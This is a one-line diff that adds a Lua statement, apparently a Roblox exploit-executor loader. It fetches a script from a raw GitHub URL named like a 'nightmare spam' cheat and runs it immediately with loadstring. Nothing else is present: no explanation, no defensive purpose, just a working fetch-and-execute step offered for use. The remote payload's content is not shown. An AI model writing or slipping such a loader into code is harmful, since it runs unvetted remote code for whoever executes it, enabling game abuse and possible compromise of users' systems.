@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/huntress-nightmare-spam2-wf6ncx6ooevu1g.lua"))()
